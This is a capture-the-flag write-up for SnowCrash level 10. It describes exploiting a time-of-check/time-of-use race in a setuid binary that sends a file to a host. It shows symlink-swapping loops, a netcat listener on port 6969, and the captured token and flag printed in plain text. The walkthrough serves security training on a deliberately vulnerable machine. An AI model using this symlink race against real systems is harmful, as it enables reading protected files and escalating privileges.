# Flag 10

And again in the level10 we found two file a binary and a token file.

```
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

```
We run the binary and it printed the next message
```
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it

```
So it takes two arguments a file and a host.
we opened the binary in binary ninja to find out what it does,
and it's simply check if we have the right to read the file we give it after that is sends its content the host you give it as second argument in the port `6969`.

we only have one problem, we dont have the right to read the token file.
but we can use race condition and trick the program to send us the token content.

we created two scripts, one contains an infinite loop that switch symbolic links between two file, the token and a file we created and have read permission on it and the other contains an infinite loop that executes the program.

```
scp -P 4242 getflag10.sh run.sh level10@192.168.1.70:/tmp/
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.70 
level10@192.168.1.70's password: 
getflag10.sh                                                                                                                                                       100%  177   511.3KB/s   00:00    
run.sh 
```
And we used nectat to listen on `6969` port.

```
level10@SnowCrash:~$ nc -l -k 6969
[...]
.*( )*.
.*( )*.
fake
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
[...]
```

we got our flag:

```
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

```